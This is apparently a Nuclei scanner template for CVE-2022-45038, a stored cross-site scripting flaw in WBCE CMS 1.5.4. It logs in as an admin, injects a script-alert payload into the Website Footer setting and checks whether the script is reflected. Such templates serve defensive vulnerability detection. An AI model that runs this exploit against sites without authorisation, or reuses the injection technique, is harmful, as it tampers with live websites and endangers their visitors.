http:
- extractors:
  - group: 1
    internal: true
    name: username_fieldname
    part: body
    regex:
    - name="username_fieldname" value="(.*)"
    type: regex
  - group: 1
    internal: true
    name: password_fieldname
    part: body
    regex:
    - name="password_fieldname" value="(.*)"
    type: regex
  - group: 1
    internal: true
    name: formtoken
    part: body
    regex:
    - name="formtoken" value="(.*)"
    type: regex
  - group: 1
    internal: true
    name: app_name
    part: body
    regex:
    - name="app_name" value="(.*?)"
    type: regex
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - <script>alert(document.domain)</script>
    - Results For
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /admin/login/index.php HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /admin/login/index.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    url=&username_fieldname={{username_fieldname}}&password_fieldname={{password_fieldname}}&{{username_fieldname}}={{username}}&{{password_fieldname}}={{password}}&submit=Login

    '
  - 'GET /admin/settings/ HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /admin/settings/save.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    advanced=no&formtoken={{formtoken}}&website_footer=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&page_trash=inline&home_folders=true&intro_page=false&frontend_login=false&frontend_signup=false&submit=&default_language=EN&default_timezone=0&default_date_format=d.m.Y&default_time_format=H%3Ai&default_template=wbcezon&default_theme=wbce_flat_theme&search=public&search_template=&page_spacer=-&app_name={{app_name}}&sec_anchor=wbce_&wbmailer_default_sendername=WBCE+CMS+Mailer&wbmailer_routine=phpmail&wbmailer_smtp_host=&wbmailer_smtp_port=&wbmailer_smtp_secure=&wbmailer_smtp_username=&wbmailer_smtp_password=

    '
  - 'GET /search/index.php HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2022-45038
info:
  author: theamanrawat
  classification:
    cpe: cpe:2.3:a:wbce:wbce_cms:1.5.4:*:*:*:*:*:*:*
    cve-id: CVE-2022-45038
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 5.4
    cwe-id: CWE-79
    epss-percentile: 0.95497
    epss-score: 0.21323
  description: 'A cross-site scripting (XSS) vulnerability in /admin/settings/save.php
    of WBCE CMS v1.5.4 allows attackers to execute arbitrary web scripts or HTML via
    a crafted payload injected into the Website Footer field.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    inject malicious scripts into web pages viewed by users, leading to potential
    data theft, session hijacking, or defacement of the affected website.

    '
  metadata:
    max-request: 5
    product: wbce_cms
    vendor: wbce
    verified: true
  name: WBCE CMS v1.5.4 - Cross Site Scripting (Stored)
  reference:
  - https://github.com/WBCE/WBCE_CMS
  - https://shimo.im/docs/Ee32MrJd80iEwyA2/read
  - https://nvd.nist.gov/vuln/detail/CVE-2022-45038
  remediation: 'Upgrade to a patched version of WBCE CMS or apply the necessary security
    patches provided by the vendor.

    '
  severity: medium
  tags: cve2022,cve,xss,wbce,cms,authenticated,vuln
